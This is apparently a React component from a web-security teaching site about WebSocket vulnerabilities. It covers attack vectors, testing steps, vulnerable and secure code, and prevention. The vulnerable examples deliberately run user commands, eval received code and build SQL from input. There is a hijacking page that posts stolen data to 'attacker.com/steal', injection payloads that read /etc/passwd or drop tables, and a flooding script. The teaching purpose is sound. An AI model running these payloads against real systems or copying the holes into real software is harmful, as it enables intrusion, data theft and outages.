
import React from 'react';
import { Bug } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const WebSocketVulnerabilities: React.FC = () => {
  return (
    <section id="websocket" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">WebSocket Vulnerabilities</h3>
      
      {/* Introduction */}
      <div className="mb-8">
        <p className="mb-6">
          WebSockets provide full-duplex communication channels over a single TCP connection, enabling real-time 
          data exchange between clients and servers. However, WebSockets can introduce unique security vulnerabilities
          when not properly implemented, often bypassing traditional web security controls.
        </p>
      </div>

      {/* What Attackers Try to Achieve */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">What Attackers Try to Achieve</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Bypass Authentication:</strong> Access WebSocket endpoints without proper authentication</li>
          <li><strong>Cross-Site WebSocket Hijacking:</strong> Execute unauthorized actions on behalf of authenticated users</li>
          <li><strong>Data Exfiltration:</strong> Access sensitive data through WebSocket channels</li>
          <li><strong>Message Injection:</strong> Inject malicious messages to manipulate application state</li>
          <li><strong>Denial of Service:</strong> Overwhelm WebSocket servers with connection floods or large messages</li>
          <li><strong>Protocol Smuggling:</strong> Bypass security controls by tunneling other protocols through WebSockets</li>
        </ul>
      </div>

      {/* Vulnerable Components */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>WebSocket Handshake:</strong> Missing origin validation during connection establishment</li>
          <li><strong>Authentication Mechanisms:</strong> Weak or missing authentication for WebSocket connections</li>
          <li><strong>Message Handlers:</strong> Input validation gaps in WebSocket message processing</li>
          <li><strong>Session Management:</strong> Improper session handling in WebSocket contexts</li>
          <li><strong>Rate Limiting:</strong> Missing rate limiting for WebSocket connections and messages</li>
          <li><strong>Error Handling:</strong> Information disclosure through verbose error messages</li>
        </ul>
      </div>

      {/* Why These Attacks Work */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Why WebSocket Attacks Work</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Protocol Differences:</strong> WebSockets bypass traditional HTTP security controls like CORS for ongoing communication</li>
          <li><strong>Persistent Connections:</strong> Long-lived connections can maintain unauthorized access</li>
          <li><strong>Limited Security Headers:</strong> Standard web security headers don't apply to WebSocket traffic</li>
          <li><strong>Lack of Built-in Authentication:</strong> WebSocket protocol doesn't include authentication mechanisms</li>
          <li><strong>Origin Header Spoofing:</strong> Origin header can be easily manipulated by attackers</li>
          <li><strong>Binary Data Support:</strong> Can be used to bypass text-based security filters</li>
        </ul>
      </div>

      {/* Common Attack Vectors */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Common WebSocket Attack Vectors</h4>
        
        <h5 className="text-lg font-medium mb-3">1. Cross-Site WebSocket Hijacking (CSWSH)</h5>
        <p className="mb-4">
          Similar to CSRF but for WebSocket connections, allowing attackers to establish unauthorized WebSocket connections.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Attack Process:</p>
          <pre className="text-sm bg-cybr-muted p-2 rounded">
{`1. Victim visits attacker's malicious website
2. Malicious JavaScript attempts WebSocket connection to target
3. Browser automatically includes authentication cookies
4. Attacker gains unauthorized WebSocket access
5. Attacker can send/receive messages as the victim`}
          </pre>
        </div>

        <h5 className="text-lg font-medium mb-3">2. WebSocket Message Injection</h5>
        <p className="mb-4">
          Injecting malicious content through WebSocket messages to manipulate application behavior.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Common Injection Types:</p>
          <ul className="list-disc pl-4 text-sm">
            <li>JSON injection to modify message structure</li>
            <li>Command injection through message parameters</li>
            <li>XSS through WebSocket messages displayed in UI</li>
            <li>SQL injection via WebSocket data processing</li>
          </ul>
        </div>

        <h5 className="text-lg font-medium mb-3">3. Authentication Bypass</h5>
        <p className="mb-4">
          Exploiting weak authentication mechanisms in WebSocket implementations.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Common Scenarios:</p>
          <ul className="list-disc pl-4 text-sm">
            <li>Missing authentication check during handshake</li>
            <li>Token-based auth not properly validated</li>
            <li>Session fixation in WebSocket contexts</li>
            <li>Privilege escalation through message manipulation</li>
          </ul>
        </div>
      </div>

      {/* Step-by-Step Exploitation */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Step-by-Step Exploitation Process</h4>
        
        <h5 className="text-lg font-medium mb-3">Phase 1: Discovery and Reconnaissance</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Identify WebSocket endpoints using browser dev tools or proxy tools</li>
          <li>Analyze WebSocket handshake requests and headers</li>
          <li>Map WebSocket message formats and protocols</li>
          <li>Identify authentication mechanisms used</li>
          <li>Test for origin validation during connection establishment</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Phase 2: Authentication Testing</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Test WebSocket connection without authentication</li>
          <li>Attempt connection with invalid/expired tokens</li>
          <li>Test for session fixation vulnerabilities</li>
          <li>Check if authentication persists throughout connection lifetime</li>
          <li>Test privilege escalation through message manipulation</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Phase 3: Message Injection Testing</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Analyze message structure and expected formats</li>
          <li>Test various injection payloads in message fields</li>
          <li>Attempt to break JSON/XML parsing with malformed data</li>
          <li>Test for command injection through message parameters</li>
          <li>Check for XSS in messages that get displayed in UI</li>
        </ol>
      </div>

      {/* Vulnerable Code Examples */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
        
        <CodeExample 
          language="javascript" 
          isVulnerable={true}
          title="Vulnerable WebSocket Server - No Authentication/Origin Check" 
          code={`// Node.js WebSocket server with multiple vulnerabilities
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

// No origin checking or authentication
wss.on('connection', function connection(ws, req) {
  console.log('New connection from:', req.socket.remoteAddress);
  
  // Send sensitive data immediately without auth check
  ws.send(JSON.stringify({
    type: 'welcome',
    userData: {
      id: 123,
      username: 'admin',
      balance: 10000,
      isAdmin: true
    }
  }));
  
  ws.on('message', function incoming(message) {
    try {
      const data = JSON.parse(message);
      
      // Vulnerable: No input validation
      if (data.type === 'transfer') {
        // Direct SQL query without sanitization
        const query = \`UPDATE accounts SET balance = balance - \${data.amount} WHERE id = \${data.fromAccount}\`;
        executeQuery(query);
        
        ws.send(JSON.stringify({
          type: 'success',
          message: 'Transfer completed'
        }));
      }
      
      // Vulnerable: Command execution based on user input
      if (data.type === 'system') {
        const { exec } = require('child_process');
        exec(data.command, (error, stdout, stderr) => {
          ws.send(JSON.stringify({
            type: 'system_result',
            output: stdout,
            error: stderr
          }));
        });
      }
      
    } catch (e) {
      // Information disclosure
      ws.send(JSON.stringify({
        type: 'error',
        message: e.toString(),
        stack: e.stack
      }));
    }
  });
});`} 
        />

        <CodeExample 
          language="html" 
          isVulnerable={true}
          title="Vulnerable Client-Side WebSocket Implementation" 
          code={`<!-- Vulnerable WebSocket client -->
<script>
// Vulnerable: No origin validation, accepts any WebSocket URL
function connectToWebSocket(url) {
  const ws = new WebSocket(url);
  
  ws.onopen = function(event) {
    console.log('Connected to WebSocket');
    
    // Vulnerable: Sending sensitive data without encryption
    ws.send(JSON.stringify({
      type: 'auth',
      token: localStorage.getItem('authToken'),
      sessionId: document.cookie.match(/sessionId=([^;]+)/)[1]
    }));
  };
  
  ws.onmessage = function(event) {
    const data = JSON.parse(event.data);
    
    // Vulnerable: No validation of incoming messages
    if (data.type === 'display') {
      // XSS vulnerability - directly inserting content
      document.getElementById('content').innerHTML = data.html;
    }
    
    if (data.type === 'redirect') {
      // Open redirect vulnerability
      window.location.href = data.url;
    }
    
    // Vulnerable: Eval-based message processing
    if (data.type === 'script') {
      eval(data.code);
    }
  };
  
  ws.onerror = function(error) {
    console.log('WebSocket Error: ' + error);
  };
}

// Vulnerable: Connecting to user-provided URL without validation
const wsUrl = new URLSearchParams(window.location.search).get('wsUrl');
if (wsUrl) {
  connectToWebSocket(wsUrl);
}
</script>`} 
        />
      </div>

      {/* Example Payloads */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Example Attack Payloads</h4>
        
        <h5 className="text-lg font-medium mb-3">Cross-Site WebSocket Hijacking Payload</h5>
        <CodeExample 
          language="html" 
          isVulnerable={true}
          title="CSWSH Attack Page" 
          code={`<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
</head>
<body>
    <h1>Welcome to our site!</h1>
    
    <script>
    // Malicious WebSocket connection
    const ws = new WebSocket('wss://vulnerable-bank.com/websocket');
    
    ws.onopen = function() {
        console.log('Connected to victim WebSocket');
        
        // Send malicious commands
        ws.send(JSON.stringify({
            type: 'transfer',
            fromAccount: 'victim_account',
            toAccount: 'attacker_account',
            amount: 10000
        }));
        
        ws.send(JSON.stringify({
            type: 'getAccountInfo',
            accountId: 'all'
        }));
    };
    
    ws.onmessage = function(event) {
        const data = JSON.parse(event.data);
        
        // Exfiltrate data to attacker server
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    };
    </script>
</body>
</html>`} 
        />

        <h5 className="text-lg font-medium mb-3">Message Injection Payloads</h5>
        <CodeExample 
          language="json" 
          isVulnerable={true}
          title="Various Injection Payloads" 
          code={`// SQL Injection via WebSocket
{
  "type": "search",
  "query": "'; DROP TABLE users; --"
}

// XSS via WebSocket message
{
  "type": "chat",
  "message": "<script>alert('XSS via WebSocket')</script>"
}

// Command Injection
{
  "type": "system",
  "command": "ls -la; cat /etc/passwd"
}

// JSON Structure Manipulation
{
  "type": "updateProfile",
  "data": {
    "name": "John",
    "__proto__": {
      "isAdmin": true
    }
  }
}

// Binary Data Bypass
{
  "type": "upload",
  "data": "\\x89PNG\\r\\n\\x1a\\n...malicious binary data..."
}`} 
        />
      </div>

      {/* Testing Tools and Techniques */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Testing Tools and Techniques</h4>
        
        <h5 className="text-lg font-medium mb-3">Manual Testing Tools</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Browser DevTools:</strong> Network tab to inspect WebSocket traffic</li>
          <li><strong>Burp Suite:</strong> WebSocket proxy and testing capabilities</li>
          <li><strong>OWASP ZAP:</strong> WebSocket fuzzing and security testing</li>
          <li><strong>wscat:</strong> Command-line WebSocket client for testing</li>
          <li><strong>Postman:</strong> WebSocket testing with GUI interface</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Automated Testing</h5>
        <CodeExample 
          language="python" 
          title="Python WebSocket Security Testing Script" 
          code={`import websocket
import json
import threading
import time

class WebSocketTester:
    def __init__(self, url):
        self.url = url
        self.ws = None
        
    def test_authentication_bypass(self):
        """Test if WebSocket accepts connections without auth"""
        try:
            self.ws = websocket.create_connection(self.url)
            # Try to send sensitive requests without authentication
            test_message = json.dumps({
                "type": "getAdminData",
                "userId": "admin"
            })
            self.ws.send(test_message)
            response = self.ws.recv()
            print(f"Auth bypass test response: {response}")
        except Exception as e:
            print(f"Auth bypass test failed: {e}")
    
    def test_injection_attacks(self):
        """Test various injection payloads"""
        payloads = [
            {"type": "search", "query": "'; DROP TABLE users; --"},
            {"type": "chat", "message": "<script>alert('XSS')</script>"},
            {"type": "system", "command": "cat /etc/passwd"},
        ]
        
        for payload in payloads:
            try:
                self.ws.send(json.dumps(payload))
                response = self.ws.recv()
                print(f"Injection test - Payload: {payload}, Response: {response}")
            except Exception as e:
                print(f"Injection test error: {e}")
    
    def test_dos_attack(self):
        """Test for DoS vulnerabilities"""
        try:
            # Test message flooding
            for i in range(1000):
                large_message = "A" * 1000000  # 1MB message
                self.ws.send(large_message)
                
            # Test connection flooding
            connections = []
            for i in range(100):
                try:
                    conn = websocket.create_connection(self.url)
                    connections.append(conn)
                except:
                    break
                    
            print(f"Created {len(connections)} connections")
        except Exception as e:
            print(f"DoS test error: {e}")

# Usage
tester = WebSocketTester("ws://target.com/websocket")
tester.test_authentication_bypass()
tester.test_injection_attacks()
tester.test_dos_attack()`} 
        />
      </div>

      {/* Secure Implementation */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Secure WebSocket Implementation</h4>
        
        <CodeExample 
          language="javascript" 
          isVulnerable={false}
          title="Secure WebSocket Server Implementation" 
          code={`const WebSocket = require('ws');
const jwt = require('jsonwebtoken');
const rateLimit = require('ws-rate-limit');

// Secure WebSocket server configuration
const wss = new WebSocket.Server({
  port: 8080,
  // Use HTTPS server for secure WebSocket (wss://)
  server: httpsServer,
  
  // Comprehensive client verification
  verifyClient: (info, callback) => {
    const origin = info.origin;
    const allowedOrigins = [
      'https://example.com',
      'https://app.example.com'
    ];
    
    // Strict origin validation
    if (!allowedOrigins.includes(origin)) {
      console.log(\`Rejected connection from origin: \${origin}\`);
      return callback(false, 403, 'Origin not allowed');
    }
    
    // Extract and verify authentication token
    const url = new URL(info.req.url, 'https://example.com');
    const token = url.searchParams.get('token');
    
    if (!token) {
      return callback(false, 401, 'Authentication required');
    }
    
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET);
      info.req.user = decoded;
      callback(true);
    } catch (err) {
      console.log('Invalid token:', err.message);
      callback(false, 401, 'Invalid token');
    }
  }
});

// Rate limiting configuration
const limiter = rateLimit({
  tokensPerInterval: 50,
  interval: 60000, // 50 messages per minute
  skipSuccessfulRequests: false
});

wss.on('connection', function connection(ws, req) {
  const user = req.user;
  const ip = req.socket.remoteAddress;
  
  console.log(\`Secure connection established for user: \${user.id}\`);
  
  // Apply rate limiting
  ws.use(limiter);
  
  // Send minimal, user-specific data
  ws.send(JSON.stringify({
    type: 'welcome',
    userId: user.id,
    timestamp: Date.now()
  }));
  
  ws.on('message', function incoming(message) {
    // Rate limiting check
    if (!limiter.check(1, ip)) {
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Rate limit exceeded'
      }));
      return;
    }
    
    try {
      // Validate message size
      if (message.length > 10240) { // 10KB limit
        ws.send(JSON.stringify({
          type: 'error',
          message: 'Message too large'
        }));
        return;
      }
      
      const data = JSON.parse(message);
      
      // Validate message structure
      if (!data.type || typeof data.type !== 'string') {
        ws.send(JSON.stringify({
          type: 'error',
          message: 'Invalid message format'
        }));
        return;
      }
      
      // Process message based on type with proper authorization
      switch (data.type) {
        case 'getProfile':
          // Authorization check
          if (data.userId !== user.id && !user.isAdmin) {
            ws.send(JSON.stringify({
              type: 'error',
              message: 'Unauthorized access'
            }));
            return;
          }
          
          const profile = getSecureUserProfile(data.userId);
          ws.send(JSON.stringify({
            type: 'profile',
            data: profile
          }));
          break;
          
        case 'transfer':
          // Validate transfer permissions
          if (!user.permissions.includes('transfer')) {
            ws.send(JSON.stringify({
              type: 'error',
              message: 'Transfer not permitted'
            }));
            return;
          }
          
          // Input validation and sanitization
          const amount = parseFloat(data.amount);
          if (isNaN(amount) || amount <= 0 || amount > 10000) {
            ws.send(JSON.stringify({
              type: 'error',
              message: 'Invalid transfer amount'
            }));
            return;
          }
          
          // Use parameterized queries
          const result = executeSecureTransfer(user.id, data.toAccount, amount);
          ws.send(JSON.stringify({
            type: 'transferResult',
            success: result.success,
            transactionId: result.id
          }));
          break;
          
        default:
          ws.send(JSON.stringify({
            type: 'error',
            message: 'Unknown message type'
          }));
      }
      
    } catch (e) {
      // Generic error response - no sensitive info
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Failed to process message'
      }));
      
      // Log detailed error server-side
      console.error(\`WebSocket error for user \${user.id}:\`, e);
    }
  });
  
  ws.on('close', () => {
    console.log(\`Connection closed for user: \${user.id}\`);
  });
  
  // Heartbeat to detect broken connections
  ws.isAlive = true;
  ws.on('pong', () => {
    ws.isAlive = true;
  });
});

// Clean up broken connections
const interval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);`} 
        />

        <CodeExample 
          language="javascript" 
          isVulnerable={false}
          title="Secure Client-Side WebSocket Implementation" 
          code={`class SecureWebSocketClient {
  constructor(url, options = {}) {
    this.url = url;
    this.options = {
      maxReconnectAttempts: 5,
      reconnectInterval: 5000,
      maxMessageSize: 10240,
      ...options
    };
    this.ws = null;
    this.reconnectAttempts = 0;
    this.messageQueue = [];
  }
  
  connect(token) {
    // Validate URL to prevent open redirect
    if (!this.isValidWebSocketURL(this.url)) {
      throw new Error('Invalid WebSocket URL');
    }
    
    // Use secure WebSocket (wss://) and include auth token
    const secureUrl = \`\${this.url}?token=\${encodeURIComponent(token)}\`;
    
    this.ws = new WebSocket(secureUrl);
    
    this.ws.onopen = (event) => {
      console.log('Secure WebSocket connection established');
      this.reconnectAttempts = 0;
      
      // Send queued messages
      this.processMessageQueue();
    };
    
    this.ws.onmessage = (event) => {
      try {
        // Validate message size
        if (event.data.length > this.options.maxMessageSize) {
          console.error('Message exceeds size limit');
          return;
        }
        
        const data = JSON.parse(event.data);
        
        // Validate message structure
        if (!data.type) {
          console.error('Invalid message format');
          return;
        }
        
        this.handleSecureMessage(data);
        
      } catch (e) {
        console.error('Failed to process WebSocket message:', e);
      }
    };
    
    this.ws.onclose = (event) => {
      console.log('WebSocket connection closed:', event.code);
      this.attemptReconnect();
    };
    
    this.ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };
  }
  
  handleSecureMessage(data) {
    switch (data.type) {
      case 'profile':
        // Sanitize data before displaying
        this.displayProfile(this.sanitizeHTML(data.data));
        break;
        
      case 'notification':
        // Validate notification data
        if (this.isValidNotification(data)) {
          this.showNotification(data.message);
        }
        break;
        
      case 'error':
        console.error('Server error:', data.message);
        break;
        
      default:
        console.warn('Unknown message type:', data.type);
    }
  }
  
  sendSecureMessage(type, payload) {
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      // Queue message for when connection is available
      this.messageQueue.push({ type, payload });
      return;
    }
    
    // Validate message before sending
    const message = {
      type: type,
      ...payload,
      timestamp: Date.now()
    };
    
    // Check message size
    const messageStr = JSON.stringify(message);
    if (messageStr.length > this.options.maxMessageSize) {
      console.error('Message too large to send');
      return;
    }
    
    this.ws.send(messageStr);
  }
  
  isValidWebSocketURL(url) {
    try {
      const parsedUrl = new URL(url);
      return parsedUrl.protocol === 'wss:' || 
             (parsedUrl.protocol === 'ws:' && parsedUrl.hostname === 'localhost');
    } catch {
      return false;
    }
  }
  
  sanitizeHTML(html) {
    const div = document.createElement('div');
    div.textContent = html;
    return div.innerHTML;
  }
  
  isValidNotification(data) {
    return data.message && 
           typeof data.message === 'string' && 
           data.message.length < 200;
  }
  
  attemptReconnect() {
    if (this.reconnectAttempts < this.options.maxReconnectAttempts) {
      this.reconnectAttempts++;
      setTimeout(() => {
        console.log(\`Reconnect attempt \${this.reconnectAttempts}\`);
        this.connect();
      }, this.options.reconnectInterval);
    } else {
      console.error('Max reconnection attempts reached');
    }
  }
  
  processMessageQueue() {
    while (this.messageQueue.length > 0) {
      const message = this.messageQueue.shift();
      this.sendSecureMessage(message.type, message.payload);
    }
  }
  
  disconnect() {
    if (this.ws) {
      this.ws.close();
      this.ws = null;
    }
  }
}

// Usage
const wsClient = new SecureWebSocketClient('wss://api.example.com/websocket');
const authToken = localStorage.getItem('authToken');

if (authToken) {
  wsClient.connect(authToken);
} else {
  console.error('No authentication token available');
}`} 
        />
      </div>

      {/* Prevention Strategies */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Prevention Strategies</h4>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <h5 className="text-lg font-semibold mb-3">Server-Side Security</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li>Implement strict origin validation during handshake</li>
              <li>Use proper authentication mechanisms (JWT tokens)</li>
              <li>Validate and sanitize all incoming messages</li>
              <li>Implement rate limiting for connections and messages</li>
              <li>Use parameterized queries for database operations</li>
              <li>Apply principle of least privilege for WebSocket operations</li>
              <li>Implement comprehensive logging and monitoring</li>
            </ul>
          </div>
          
          <div>
            <h5 className="text-lg font-semibold mb-3">Client-Side Security</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li>Always use secure WebSockets (wss://) in production</li>
              <li>Validate WebSocket URLs before connecting</li>
              <li>Sanitize data received from WebSocket messages</li>
              <li>Implement proper error handling</li>
              <li>Use CSP headers to restrict WebSocket connections</li>
              <li>Implement message size limits</li>
              <li>Handle connection failures gracefully</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Environment-Specific Considerations */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
        
        <h5 className="text-lg font-medium mb-3">Development vs Production</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Development:</strong> May use ws:// for localhost testing, but ensure wss:// for production</li>
          <li><strong>Production:</strong> Always use wss:// with proper TLS certificates</li>
          <li><strong>Testing:</strong> Use separate WebSocket endpoints for testing to avoid production impact</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Cloud and Container Environments</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Load Balancers:</strong> Ensure proper sticky sessions for WebSocket connections</li>
          <li><strong>Container Orchestration:</strong> Handle WebSocket connections during pod restarts</li>
          <li><strong>Auto-scaling:</strong> Consider WebSocket connection persistence during scaling events</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Mobile Applications</h5>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Connection Management:</strong> Handle network changes and background/foreground transitions</li>
          <li><strong>Battery Optimization:</strong> Implement efficient heartbeat mechanisms</li>
          <li><strong>Security:</strong> Additional certificate pinning for mobile WebSocket connections</li>
        </ul>
      </div>
    </section>
  );
};

export default WebSocketVulnerabilities;
